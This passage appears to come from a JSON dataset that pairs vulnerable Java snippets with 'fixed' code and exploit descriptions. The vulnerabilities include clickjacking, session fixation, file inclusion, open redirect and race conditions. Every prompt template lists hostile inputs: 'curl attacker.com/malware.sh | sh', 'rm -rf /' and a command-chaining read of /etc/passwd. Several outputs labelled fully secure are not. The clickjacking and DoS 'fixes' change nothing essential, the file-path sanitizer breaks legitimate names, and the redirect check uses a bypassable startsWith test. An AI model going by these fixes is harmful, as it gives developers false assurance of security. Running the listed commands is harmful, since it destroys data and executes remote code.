same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import java.awt.*;\\nimport java.awt.event.*;\\nimport javax.swing.*;\\nclass ClickJackingDemo {\\n    public static void main(String[] args) {\\n        JFrame frame = new JFrame(\\\"ClickJacking Example\\\");\\n        frame.setSize(300, 200);\\n        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\\n        JPanel panel = new JPanel() {\\n            @Override\\n            protected void paintComponent(Graphics g) {\\n                super.paintComponent(g);\\n                try {\\n                    ImageIcon icon = new ImageIcon(\\\"https://example.com/image.png\\\");\\n                    g.drawImage(icon.getImage(), 0, 0, null);\\n                } catch (Exception e) {\\n                    e.printStackTrace();\\n                }\\n            }\\n        };\\n        panel.addMouseListener(new MouseAdapter() {\\n            @Override\\n            public void mouseClicked(MouseEvent e) {\\n                JOptionPane.showMessageDialog(null, \\\"Clicked on transparent area!\\\");\\n            }\\n        });\\n        frame.add(panel);\\n        frame.setVisible(true);\\n    }\\n}",
      "vulnerability_type": "Clickjacking (Low Severity)",
      "cvss_score": 3.0,
      "fixed_code": "import java.awt.*;\\nimport java.awt.event.*;\\nimport javax.swing.*;\\nclass ClickJackingDemo {\\n    public static void main(String[] args) {\\n        JFrame frame = new JFrame(\\\"ClickJacking Example\\\");\\n        frame.setSize(300, 200);\\n        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\\n        JPanel panel = new JPanel() {\\n            @Override\\n            protected void paintComponent(Graphics g) {\\n                super.paintComponent(g);\\n                try {\\n                    ImageIcon icon = new ImageIcon(\\\"https://example.com/image.png\\\");\\n                    g.drawImage(icon.getImage(), 0, 0, this.getWidth(), this.getHeight(), null);\\n                } catch (Exception e) {\\n                    e.printStackTrace();\\n                }\\n            }\\n        };\\n        panel.addMouseListener(new MouseAdapter() {\\n            @Override\\n            public void mouseClicked(MouseEvent e) {\\n                JOptionPane.showMessageDialog(null, \\\"Clicked on transparent area!\\\");\\n            }\\n        });\\n        frame.add(panel);\\n        frame.setUndecorated(true);\\n        frame.getRootPane().setWindowDecorationStyle(JRootPane.PLAIN_DIALOG);\\n        frame.setVisible(true);\\n    }\\n}",
      "exploit_ways": [
        "An attacker can overlay a transparent malicious button on top of the legitimate one, tricking users into clicking it.",
        "Users could be misled into interacting with hidden or obscured controls, leading to unintended actions.",
        "Malicious actors might use this vulnerability to make users click on buttons they believe are part of a different application."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Denial-of-Service (DoS) - Low Impact\n- Vulnerable Code: public class SlowLoop {\n    public static void main(String[] args) {\n        while (true) {\n            try {\n                Thread.sleep(10);\n            } catch (InterruptedException e) {}\n        }\n    }\n}\n- CVSS Score: 3.7\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "public class SlowLoop {\\n    public static void main(String[] args) {\\n        while (true) {\\n            try {\\n                Thread.sleep(10);\\n            } catch (InterruptedException e) {}\\n        }\\n    }\\n}",
      "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
      "cvss_score": 3.7,
      "fixed_code": "public class SafeLoop {\\n    public static void main(String[] args) throws InterruptedException {\\n        while (true) {\\n            Thread.sleep(10);\\n            // Add meaningful work or exit condition here\\n        }\\n    }\\n}",
      "exploit_ways": [
        "The infinite loop can tie up a thread, making the application unresponsive to other tasks.",
        "Running multiple instances of this program can consume system resources leading to DoS on the server.",
        "By running this code in a production environment, it can prevent other processes from accessing necessary CPU time."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Session Fixation (Low Severity)\n- Vulnerable Code: import javax.servlet.http.HttpSession;\\npublic class LoginServlet {\\n    public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\\n        HttpSession session = request.getSession(true);\\n        String sessionId = request.getParameter(\"sessionId\");\\n        if (sessionId != null) {\\n            session.changeSessionId(sessionId);\\n        }\\n        // other code\\n    }\\n}\n- CVSS Score: 4.0\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import javax.servlet.http.HttpSession;\\npublic class LoginServlet {\\n    public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\\n        HttpSession session = request.getSession(true);\\n        String sessionId = request.getParameter(\\\"sessionId\\\");\\n        if (sessionId != null) {\\n            session.changeSessionId(sessionId);\\n        }\\n        // other code\\n    }\\n}",
      "vulnerability_type": "Session Fixation (Low Severity)",
      "cvss_score": 4.0,
      "fixed_code": "import javax.servlet.http.HttpSession;\\npublic class LoginServlet {\\n    public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\\n        HttpSession session = request.getSession(true);\\n        // Do not allow client to specify the session ID\\n        // other code\\n    }\\n}",
      "exploit_ways": [
        "An attacker can provide a fixed session ID via URL parameter to maintain control over a user's session.",
        "By using the same session ID for multiple users, an attacker can hijack legitimate sessions if users log in.",
        "Attacker can exploit this by pre-generating a session ID and tricking users into logging in with it."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Information Disclosure (Low Severity)\n- Vulnerable Code: public class UserInfo {\n    private String sensitiveData;\n\n    public UserInfo(String data) {\n        this.sensitiveData = data;\n    }\n\n    public void displayInfo() {\n        System.out.println(\"Sensitive Data: \" + this.sensitiveData);\n    }\n}\n- CVSS Score: 3.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "public class UserInfo {\\n    private String sensitiveData;\\n\\n    public UserInfo(String data) {\\n        this.sensitiveData = data;\\n    }\\n\\n    public void displayInfo() {\\n        System.out.println(\\\"Sensitive Data: \\\" + this.sensitiveData);\\n    }\\n}",
      "vulnerability_type": "Information Disclosure (Low Severity)",
      "cvss_score": 3.5,
      "fixed_code": "public class UserInfo {\\n    private String sensitiveData;\\n\\n    public UserInfo(String data) {\\n        this.sensitiveData = data;\\n    }\\n\\n    public void displayInfo() {\\n        // Sensitive data should not be logged or printed.\\n        System.out.println(\\\"User information displayed\\\");\\n    }\\n}",
      "exploit_ways": [
        "An attacker with access to the output could read sensitive data directly.",
        "If logs are stored, they could contain sensitive user information leading to a data breach.",
        "Sensitive data might be inadvertently exposed in debugging or error messages."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Missing Security Headers\n- Vulnerable Code: import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/example\")\npublic class ExampleServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<h1>Welcome to our website</h1>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}\n- CVSS Score: 5.3\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import java.io.IOException;\\nimport javax.servlet.ServletException;\\nimport javax.servlet.annotation.WebServlet;\\nimport javax.servlet.http.HttpServlet;\\nimport javax.servlet.http.HttpServletRequest;\\nimport javax.servlet.http.HttpServletResponse;\\n\\n@WebServlet(\\\"/example\\\")\\npublic class ExampleServlet extends HttpServlet {\\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\\n        response.getWriter().println(\\\"<html><body>\\\");\\n        response.getWriter().println(\\\"<h1>Welcome to our website</h1>\\\");\\n        response.getWriter().println(\\\"</body></html>\\\");\\n    }\\n}",
      "vulnerability_type": "Missing Security Headers",
      "cvss_score": 5.3,
      "fixed_code": "import java.io.IOException;\\nimport javax.servlet.ServletException;\\nimport javax.servlet.annotation.WebServlet;\\nimport javax.servlet.http.HttpServlet;\\nimport javax.servlet.http.HttpServletRequest;\\nimport javax.servlet.http.HttpServletResponse;\\n\\n@WebServlet(\\\"/example\\\")\\npublic class ExampleServlet extends HttpServlet {\\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\\n        response.setHeader(\\\"Content-Security-Policy\\\", \\\"default-src 'self'\\\");\\n        response.setHeader(\\\"X-Content-Type-Options\\\", \\\"nosniff\\\");\\n        response.setHeader(\\\"X-XSS-Protection\\\", \\\"1; mode=block\\\");\\n        response.setHeader(\\\"X-Frame-Options\\\", \\\"SAMEORIGIN\\\");\\n        response.getWriter().println(\\\"<html><body>\\\");\\n        response.getWriter().println(\\\"<h1>Welcome to our website</h1>\\\");\\n        response.getWriter().println(\\\"</body></html>\\\");\\n    }\\n}",
      "exploit_ways": [
        "Attackers could inject malicious scripts leading to XSS attacks.",
        "Lack of Content-Security-Policy (CSP) can allow loading untrusted content.",
        "Improper X-Frame-Options header can lead to Clickjacking attacks."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Local File Inclusion (LFI) - Limited Scope\n- Vulnerable Code: import java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.IOException;\n\npublic class FileManager {\n    public static void main(String[] args) {\n        if (args.length > 0) {\n            String filePath = \"/safe/path/\" + args[0].replaceAll(\"\\./\", \"\").replaceAll(\"\\.\\.\", \"\");\n            try (BufferedReader br = new BufferedReader(new FileReader(filePath))) {\n                String line;\n                while ((line = br.readLine()) != null) {\n                    System.out.println(line);\n                }\n            } catch (IOException e) {\n                System.err.println(\"Error reading file: \" + e.getMessage());\n            }\n        }\n    }\n}\n- CVSS Score: 4.0\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import java.io.BufferedReader;\\nimport java.io.FileReader;\\nimport java.io.IOException;\\n\\npublic class FileManager {\\n    public static void main(String[] args) {\\n        if (args.length > 0) {\\n            String filePath = \\\"/safe/path/\\\" + args[0].replaceAll(\\\"\\./\\\", \\\"\\\").replaceAll(\\\"\\.\\.\\\", \\\"\\\");\\n            try (BufferedReader br = new BufferedReader(new FileReader(filePath))) {\\n                String line;\\n                while ((line = br.readLine()) != null) {\\n                    System.out.println(line);\\n                }\\n            } catch (IOException e) {\\n                System.err.println(\\\"Error reading file: \\\" + e.getMessage());\\n            }\\n        }\\n    }\\n}",
      "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
      "cvss_score": 4.0,
      "fixed_code": "import java.io.BufferedReader;\\nimport java.io.FileReader;\\nimport java.io.IOException;\\n\\npublic class FileManager {\\n    private static final String BASE_PATH = \\\"/safe/path/\\\";\\n\\n    public static void main(String[] args) {\\n        if (args.length > 0) {\\n            String filePath = sanitizeFilePath(args[0]);\\n            try (BufferedReader br = new BufferedReader(new FileReader(BASE_PATH + filePath))) {\\n                String line;\\n                while ((line = br.readLine()) != null) {\\n                    System.out.println(line);\\n                }\\n            } catch (IOException e) {\\n                System.err.println(\\\"Error reading file: \\\" + e.getMessage());\\n            }\\n        }\\n    }\\n\\n    private static String sanitizeFilePath(String input) {\\n        return input.replaceAll(\\\"[\\\\./\\\\.\\\\.]+\\\", \\\"\\\");\\n    }\\n}",
      "exploit_ways": [
        "An attacker could provide a filename that bypasses the regex to access \"/etc/passwd\".",
        "Could use URL encoding like %2e%2e/%2e%2e/ to navigate up directories and read unauthorized files.",
        "By providing a specially crafted filename, an attacker might exploit any weaknesses in regex handling to escape the intended directory."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Local File Inclusion (LFI) - Limited Scope\n- Vulnerable Code: import java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class FileReadServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String filePath = \"/var/log/\" + request.getParameter(\"log\");\n        try (BufferedReader reader = new BufferedReader(new FileReader(filePath))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.getWriter().println(line);\n            }\n        } catch (IOException e) {\n            response.sendError(HttpServletResponse.SC_NOT_FOUND, \"File not found.\");\n        }\n    }\n}\n- CVSS Score: 5.3\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import java.io.BufferedReader;\\nimport java.io.FileReader;\\nimport java.io.IOException;\\nimport javax.servlet.ServletException;\\nimport javax.servlet.http.HttpServlet;\\nimport javax.servlet.http.HttpServletRequest;\\nimport javax.servlet.http.HttpServletResponse;\\n\\npublic class FileReadServlet extends HttpServlet {\\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\\n        String filePath = \\\"/var/log/\\\" + request.getParameter(\\\"log\\\");\\n        try (BufferedReader reader = new BufferedReader(new FileReader(filePath))) {\\n            String line;\\n            while ((line = reader.readLine()) != null) {\\n                response.getWriter().println(line);\\n            }\\n        } catch (IOException e) {\\n            response.sendError(HttpServletResponse.SC_NOT_FOUND, \\\"File not found.\\\");\\n        }\\n    }\\n}",
      "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
      "cvss_score": 5.3,
      "fixed_code": "import java.io.BufferedReader;\\nimport java.io.FileReader;\\nimport java.io.IOException;\\nimport javax.servlet.ServletException;\\nimport javax.servlet.http.HttpServlet;\\nimport javax.servlet.http.HttpServletRequest;\\nimport javax.servlet.http.HttpServletResponse;\\n\\npublic class FileReadServlet extends HttpServlet {\\n    private static final String LOG_DIR = \\\"/var/log/\\\";\\n    private static final String[] ALLOWED_FILES = {\\\"app.log\\\", \\\"system.log\\\", \\\"error.log\\\"};\\n\\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\\n        String fileName = request.getParameter(\\\"log\\\");\\n        if (fileName != null && isValidFile(fileName)) {\\n            String filePath = LOG_DIR + fileName;\\n            try (BufferedReader reader = new BufferedReader(new FileReader(filePath))) {\\n                String line;\\n                while ((line = reader.readLine()) != null) {\\n                    response.getWriter().println(line);\\n                }\\n            } catch (IOException e) {\\n                response.sendError(HttpServletResponse.SC_NOT_FOUND, \\\"File not found.\\\");\\n            }\\n        } else {\\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \\\"Invalid file name.\\\");\\n        }\\n    }\\n\\n    private boolean isValidFile(String fileName) {\\n        for (String allowed : ALLOWED_FILES) {\\n            if (allowed.equals(fileName)) {\\n                return true;\\n            }\\n        }\\n        return false;\\n    }\\n}",
      "exploit_ways": [
        "An attacker could request \"/etc/passwd\" by manipulating the 'log' parameter to read sensitive system files.",
        "The vulnerability allows reading arbitrary log files, potentially leaking sensitive information stored in logs.",
        "Crafting a path traversal attack with '../' sequences might access files outside the intended /var/log directory if not properly mitigated."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Open Redirect\n- Vulnerable Code: public class VulnerableApp {\\n    public void redirect(String url) {\\n        try {\\n            java.net.URI uri = new java.net.URI(url);\\n            if (uri.getHost().equals(\"trusted.com\")) {\\n                javax.swing.JOptionPane.showMessageDialog(null, \"Redirecting to trusted site: \" + url);\\n            } else {\\n                throw new Exception(\\\"Unauthorized redirect attempt\\\");\\n            }\\n        } catch (Exception e) {\\n            System.out.println(e.getMessage());\\n        }\\n    }\\n}\n- CVSS Score: 6.8\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "public class VulnerableApp {\\n    public void redirect(String url) {\\n        try {\\n            java.net.URI uri = new java.net.URI(url);\\n            if (uri.getHost().equals(\\\"trusted.com\\\")) {\\n                javax.swing.JOptionPane.showMessageDialog(null, \\\"Redirecting to trusted site: \\\" + url);\\n            } else {\\n                throw new Exception(\\\\\"Unauthorized redirect attempt\\\\\");\\n            }\\n        } catch (Exception e) {\\n            System.out.println(e.getMessage());\\n        }\\n    }\\n}",
      "vulnerability_type": "Open Redirect",
      "cvss_score": 6.8,
      "fixed_code": "public class SecureApp {\\n    public void redirect(String url) {\\n        String trustedDomain = \\\"trusted.com\\\";\\n        if (url != null && url.startsWith(\\\"https://\\\" + trustedDomain)) {\\n            try {\\n                java.net.URI uri = new java.net.URI(url);\\n                javax.swing.JOptionPane.showMessageDialog(null, \\\"Redirecting to trusted site: \\\" + url);\\n            } catch (Exception e) {\\n                System.out.println(e.getMessage());\\n            }\\n        } else {\\n            System.out.println(\\\"Unauthorized redirect attempt\\\");\\n        }\\n    }\\n}",
      "exploit_ways": [
        "An attacker can use URL encoding to bypass the check (e.g., http%3A//trusted.com).",
        "Crafting a URL like https://malicious.com?redirect=https://trusted.com could trick users into thinking they are on a trusted site.",
        "Using a shortener service for malicious URLs that redirects to trusted.com can deceive security checks."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Race Condition (Difficult to Exploit)\n- Vulnerable Code: public class VulnerableRaceCondition {\n    private int counter = 0;\n\n    public void increment() {\n        try {\n            Thread.sleep(1);\n        } catch (InterruptedException e) {}\n        counter++;\n    }\n\n    public int getCounter() {\n        return counter;\n    }\n}\n- CVSS Score: 3.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "public class VulnerableRaceCondition {\\n    private int counter = 0;\\n\\n    public void increment() {\\n        try {\\n            Thread.sleep(1);\\n        } catch (InterruptedException e) {}\\n        counter++;\\n    }\\n\\n    public int getCounter() {\\n        return counter;\\n    }\\n}",
      "vulnerability_type": "Race Condition (Difficult to Exploit)",
      "cvss_score": 3.5,
      "fixed_code": "public class SecureRaceCondition {\\n    private int counter = 0;\\n    private final Object lock = new Object();\\n\\n    public void increment() {\\n        synchronized (lock) {\\n            try {\\n                Thread.sleep(1);\\n            } catch (InterruptedException e) {}\\n            counter++;\\n        }\\n    }\\n\\n    public int getCounter() {\\n        synchronized (lock) {\\n            return counter;\\n        }\\n    }\\n}",
      "exploit_ways": [
        "Multiple threads incrementing the counter simultaneously could lead to lost updates, causing the counter value to be incorrect.",
        "An attacker could create a large number of threads to overwhelm the system, potentially causing a denial of service (DoS) condition.",
        "If the counter is used for critical operations like limiting access or resources, an inaccurate count could lead to unauthorized behavior."
      ]
    }
  },
  {
